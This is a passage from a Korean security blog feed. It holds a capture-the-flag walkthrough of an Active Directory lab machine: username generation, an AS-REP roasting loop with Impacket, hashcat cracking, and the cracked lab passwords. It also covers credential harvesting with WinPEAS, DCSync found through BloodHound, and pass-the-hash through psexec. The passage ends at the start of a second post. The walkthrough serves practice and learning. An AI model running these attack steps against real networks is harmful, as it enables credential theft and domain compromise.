&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;http://egotistical-bank.local/about.html&lt;/code&gt; 로 접속하면 직원들의 이름을 확인할 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/be597dbd-270e-439f-9379-9d46daf99b85/image.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;유저네임-얻기&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%9C%A0%EC%A0%80%EB%84%A4%EC%9E%84-%EC%96%BB%EA%B8%B0&quot; aria-label=&quot;유저네임 얻기 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;유저네임 얻기&lt;/h3&gt;
&lt;p&gt;나중에 찾아보니 &lt;a href=&quot;https://github.com/ropnop/kerbrute&quot;&gt;Kerbrute&lt;/a&gt;를 활용해 좀 더 간결하고 스마트하게 사용자명을 얻는 방법이 있으나 나는 다른 방법으로 얻었다.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kerbrute를 활용하는 방법은 &lt;a href=&quot;https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#recon&quot;&gt;이 문제풀이&lt;/a&gt; 참조. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/urbanadventurer/username-anarchy&quot;&gt;Username anarchy&lt;/a&gt;를 이용하여 직원들의 풀네임을 넣으면 그걸 치환해 유저네임 형식으로 바꿔주는데 다양한 형식의 유저네임 리스트를 ASREPRoasting 공격에 넣어 얻어 걸리길 기도하는 방법이다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/88c244c4-5d61-4be2-8646-8c54a7caf1cc/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ASREPRoasting--해시-얻기&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ASREPRoasting--%ED%95%B4%EC%8B%9C-%EC%96%BB%EA%B8%B0&quot; aria-label=&quot;ASREPRoasting  해시 얻기 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;ASREPRoasting / 해시 얻기&lt;/h2&gt;
&lt;h3 id=&quot;ASREPRoating-개념&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ASREPRoating-%EA%B0%9C%EB%85%90&quot; aria-label=&quot;ASREPRoating 개념 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;ASREPRoating 개념&lt;/h3&gt;
&lt;p&gt;구글링을 하다보면 글이 길고 설명이 복잡한것들이 대부분인데, &lt;a href=&quot;https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting&quot;&gt;이 포스트&lt;/a&gt;가 간결하고 쉽게 잘 설명한 것 같다. &lt;/p&gt;
&lt;p&gt;위 포스트를 요약하자면, &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;사전 인증은 Kerberos 인증의 첫 번째 단계이며 주요 역할은 무차별 암호 추측 공격을 방지하는 것임. &lt;/li&gt;
&lt;li&gt;사전 인증 절차 중, 사용자는 타임스탬프를 암호화하는데 사용할 자격증명을 입력함. &lt;/li&gt;
&lt;li&gt;DC는 이를 해독하여 올바른 자격 증명이 사용되었는지 확인함. &lt;/li&gt;
&lt;li&gt;DC가 승인하면 TGT를 발행.&lt;/li&gt;
&lt;li&gt;사전 인증이 비활성화되면 공격자가 _모든 _사용자에 대한 티켓을 요청할 수 있음.&lt;/li&gt;
&lt;li&gt;따라서 명시적으로 계정에 &lt;code class=&quot;language-text&quot;&gt;DONT_REQ_PREAUTH&lt;/code&gt; (사전 인증 비활성화) 라는 설정이 있어야 가능한 공격임. &lt;/li&gt;
&lt;li&gt;그럼 DC는 오프라인에서 크랙할 수 있는 Kerberoast 공격과 유사하게 암호화된 TGT를 반환함. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;우선 컬브로스 88번 포트가 열려 있고, 윈도우즈 시스템이고, 사전인증이 비활성화된 계정이 있다면 시도해볼만 한 공격인 것 같다. &lt;/p&gt;
&lt;h3 id=&quot;ASREPRoasting-시도&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ASREPRoasting-%EC%8B%9C%EB%8F%84&quot; aria-label=&quot;ASREPRoasting 시도 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;ASREPRoasting 시도&lt;/h3&gt;
&lt;p&gt;아래의 명령어를 입력해 위에서 만든 유저네임 리스트를 넣어 Impacket의 GetNPUsers를 사용해 ASREPRoasting 공격을 실행, 아웃풋으로 나온 해시를 &lt;code class=&quot;language-text&quot;&gt;hash.txt&lt;/code&gt; 파일에 저장한다. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;read&lt;/span&gt; p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;do&lt;/span&gt; impacket-GetNPUsers egotistical-bank.local/&lt;span class=&quot;token string&quot;&gt;&quot;&lt;span class=&quot;token variable&quot;&gt;$p&lt;/span&gt;&quot;&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-request&lt;/span&gt; -no-pass -dc-ip &lt;span class=&quot;token number&quot;&gt;10.10&lt;/span&gt;.10.175 &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; hash.txt&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; unames.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그러면 아래와 같이 &lt;code class=&quot;language-text&quot;&gt;fsmith&lt;/code&gt; 사용자의 컬브로스 해쉬를 얻을 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/55f4b870-d498-48b7-969a-6d4cd964d98a/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;일반 텍스트 비밀번호를 얻기 위해 해쉬캣을 이용해 무차별 대입을 하면 된다. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;hashcat &lt;span class=&quot;token parameter variable&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;18200&lt;/span&gt; fsmithhash /usr/share/wordlists/rockyou.txt &lt;span class=&quot;token parameter variable&quot;&gt;--force&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;해쉬캣 모드는 &lt;code class=&quot;language-text&quot;&gt;hashcat --help | grep Kerberos&lt;/code&gt;를 입력해, &lt;code class=&quot;language-text&quot;&gt;AS-REP&lt;/code&gt; 이라고 적힌 모드 번호를 사용한다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/78b5413e-a491-483c-8936-f1744512efba/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;그러면 이렇게 크랙된 비밀번호를 얻을 수 있다. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;유저네임: &lt;code class=&quot;language-text&quot;&gt;fsmith&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;비밀번호: &lt;code class=&quot;language-text&quot;&gt;Thestrokes23&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;초입&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B4%88%EC%9E%85&quot; aria-label=&quot;초입 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;초입&lt;/h2&gt;
&lt;p&gt;Evil-WinRM을 이용하여 새로 얻은 로그인 자격증명을 넣으면 초입에 성공할 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/43b2d8fa-fe29-411c-97df-7fd457d3aebf/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;권한상승&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B6%8C%ED%95%9C%EC%83%81%EC%8A%B9&quot; aria-label=&quot;권한상승 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;권한상승&lt;/h2&gt;
&lt;h3 id=&quot;정보-수집-1&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A0%95%EB%B3%B4-%EC%88%98%EC%A7%91-1&quot; aria-label=&quot;정보 수집 1 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;정보 수집&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md&quot;&gt;WinPEAS&lt;/a&gt;를 실행하면 아래와 같이 자동로그인이 활성화된 계정정보를 비밀번호와 함께 얻을 수 있다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/7143ac67-0377-4a57-b206-1d392687d4c0/image.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;유저네임: &lt;code class=&quot;language-text&quot;&gt;svc_loanmanager&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;비밀번호: &lt;code class=&quot;language-text&quot;&gt;Moneymakestheworldgoround!&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;시도&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%8B%9C%EB%8F%84&quot; aria-label=&quot;시도 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;시도&lt;/h3&gt;
&lt;p&gt;초입 방식와 같이 새로 얻은 자격증명을 활용해 Evil WinRM을 통해 연결해보자. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/779305e0-89f4-430f-a9bf-9435496ee062/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;블러드하운드-BloodHound&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%B8%94%EB%9F%AC%EB%93%9C%ED%95%98%EC%9A%B4%EB%93%9C-BloodHound&quot; aria-label=&quot;블러드하운드 BloodHound permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;블러드하운드 (BloodHound)&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/SpecterOps/BloodHound-Legacy&quot;&gt;블러드하운드&lt;/a&gt;를 사용하면 액티브디렉토리 도메인 열거 및 시각화를 할 수 있는데 권한상승을 위한 정보 수집시 가이드 역할을 해주는 아주 유용한 툴이다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/ee48adf9-5457-41dc-af91-e94e39c5235f/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Queries&lt;/code&gt; 탭에서 &lt;code class=&quot;language-text&quot;&gt;Find Principals with DCSync Rights&lt;/code&gt; 를 클릭하면 현 사용자가 &lt;code class=&quot;language-text&quot;&gt;GetChangesAll&lt;/code&gt;을 통해 도메인과 연결이 된 것을 볼 수 있다.&lt;/p&gt;
&lt;p&gt;가장자리를 우클릭하고 &lt;code class=&quot;language-text&quot;&gt;Help&lt;/code&gt;를 클릭하면 svc_loanmgr(현 사용자)가 DCSync 공격을 사용하여 도메인 컨트롤러에서 비밀번호 해시를 덤프할 수 있음을 알 수 있다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/63046407-49dc-4d39-828d-1a0461df8a88/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;디씨씽크-DCSync&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%94%94%EC%94%A8%EC%94%BD%ED%81%AC-DCSync&quot; aria-label=&quot;디씨씽크 DCSync permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;디씨씽크 (DCSync)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/8682c72b-2a15-43ad-984b-c520fd415b15/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;이렇게 하면 관리자의 해쉬를 얻을 수 있다.
이 방법 외에도 미미켓즈 (Mimikatz)를 타겟에서 실행해 관리자 해쉬를 얻는 방법, 디씨씽크를 통해 얻은 해쉬를 Evil-WinRM에 그대로 넣어 관리자로써 연결하는 방법이 있다고 한다. &lt;/p&gt;
&lt;h2 id=&quot;패스더해시-PtH&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%ED%8C%A8%EC%8A%A4%EB%8D%94%ED%95%B4%EC%8B%9C-PtH&quot; aria-label=&quot;패스더해시 PtH permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;패스더해시 (PtH)&lt;/h2&gt;
&lt;p&gt;나는 해쉬를 임패켓 (Impacket) 피에스이그젝 (psexec.py)에 넣어 패스하는 방법을 택했다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/bb50f669-d675-4dc1-b889-b7e982d0b215/image.png&quot;&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Editorial]]></title><description><![CDATA[Editorial 요약  🌟 한 줄 평
비슷한 방식의 테크닉이 여러번 반복되는 느낌이 있으나, SSRF를 연습하기에 좋았고 초입까지 가는 과정이 다른 쉬운 레벨의 시스템보다 복잡해 좀 더 현실적이라는 느낌을 받았다.  'Editorial…]]></description><link>https://h3llanut3lla.github.io/Editorial/</link><guid isPermaLink="false">https://h3llanut3lla.github.io/Editorial/</guid><pubDate>Sat, 08 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2 id=&quot;Editorial-요약&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Editorial-%EC%9A%94%EC%95%BD&quot; aria-label=&quot;Editorial 요약 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Editorial 요약&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/fbaf8181-884b-4302-994a-4f0b91a51d79/image.png&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;🌟 &lt;strong&gt;한 줄 평&lt;/strong&gt;
